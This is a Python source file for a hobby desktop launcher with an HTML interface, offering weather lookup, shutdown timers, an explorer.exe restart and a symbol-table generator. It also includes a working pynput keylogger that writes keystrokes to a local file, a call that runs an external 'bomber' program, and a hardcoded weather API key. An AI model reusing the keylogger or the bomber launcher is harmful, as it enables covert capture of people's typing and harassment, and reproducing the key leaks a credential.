'''
Лаунчер от SKISTE
'''

# Импорт всех требуемых библиотек
from pyowm import OWM                      # Погода
from time import *
from pyowm.utils import config
from pyowm.utils import timestamps
from pyowm.utils import weather
import eel                                   # Интерфейс через HTML
import os                                    # Для обращение к cmd
#import easygui as gui                       # Для создания диалоговых окон Windows(Ломает компилятор)
import pynput                                
from pynput.keyboard import Key, Listener    # Запрашиваем из библиотеки pynput нужные нам дистрибутивы
import logging                               # Библиотека для легкого изменения файлов и логов
import datetime                              # Библиотека для получения времени

owm = OWM('501fc5a4f679c097c996da39b2cef9d1')
now = datetime.datetime.now()                # Создаем переменную now, которая хранит в себе время
defdir = os.getcwd()                         # Основная директория откуда запускается приложение
eel.init('web')                              # Иницилизируем нашу папку с интерфейсом
@eel.expose
def weather(city):
	eel.weatherwait()
	mgr = owm.weather_manager()
	observation = mgr.weather_at_place(city)
	w = observation.weather
	temperature = w.temperature('celsius')['temp']
	detail_status = w.status
	print('temperature = '+str(temperature)+"\nDetail_status = "+str(detail_status)+"\n")
	if detail_status == "Clouds":
		temp = '☁'+str(int(temperature))+'°' # CLOUD
		print(temp)
	elif detail_status == "Rain":
		temp = '🌧'+str(int(temperature))+'°' # RAIN
		print(temp)
	elif detail_status == "Snow":
		temp = '❄️'+str(int(temperature))+'°' # SNOW
		print(temp)
	elif detail_status == "Thunderstorm":
		temp = '⚡'+str(int(temperature))+'°' # THUNDER
		print(temp)
	else:
		temp = '🌡'+str(int(temperature))+'°' # NORMAL
		print(temp)
	eel.weatherjs(temp)
	return 'All Done!'
# Функция для создания файла
@eel.expose
def keyloggcreate():
    logging.basicConfig(filename = ("KeyLog for "+str(now.hour)+"-"+str(now.minute)+".txt"),level = logging.DEBUG, format = '%(asctime)s : %(message)s',datefmt='%I:%M:%S', filemode='w')

# Функция запуска кейлоггера
@eel.expose
def keylogg():
	with Listener(on_press = keypress) as listener:
		listener.join()

# Запуск бомбера
@eel.expose
def bomber():
    print('Запускается функция bomber')
    os.system("bomber")

# Выключение пк через n кол-во времени
@eel.expose
def shtdwm(min):
    print('Запускается функция shtdwn(min)')
    if min == 0:
        os.system("shutdown /a")
    else:
        os.system("shutdown -s -t "+str(min))

# Перезапуск explorer.exe
@eel.expose
def explorerrst():
    print('Запускается функция explorerrst')
    import time
    os.system("taskkill /IM explorer.exe /F")
    os.system("start C:\Windows\explorer.exe")

# Функция с генерацией символов
@eel.expose
def symgen(symstart,symend):
    print('Запускается symgen(symstart,symend)')
    temppath = str(defdir)+'\Symbols.html'
    print('Создали temppath: '+temppath)
    print('Создавать файл')
    with open(temppath, 'w') as f:
        print('Вписываем теги для html')
        f.write('<html><head><title>gg</title></head><body style="font-size:50px;">')
        print('Запускаем функцию')
        while int(symstart) < int(symend):   # Использована другая методика создания файла, без использования библиотеки logging
            f.write('&#'+str(symstart)+'; - '+str(symstart)+'<br>')
            print('Сейчас - '+str(symstart))
            symstart = int(symstart)+1
        print('Функция завершена')
        print('Ввели конец html')
        f.write('</body></html>')
    f.close()

# Функция вписывания кнопок в файл
def keypress(Key):
	print(str(Key)+" вписан")
	logging.info(str(Key))
	if str(Key) == "Key.ctrl_r":
		print('Функция должна вырубится')
		return False	
# Выведение самого интерфейса пользователю
eel.start("main.html", size=(655, 500), position=(500, 400), port=(0))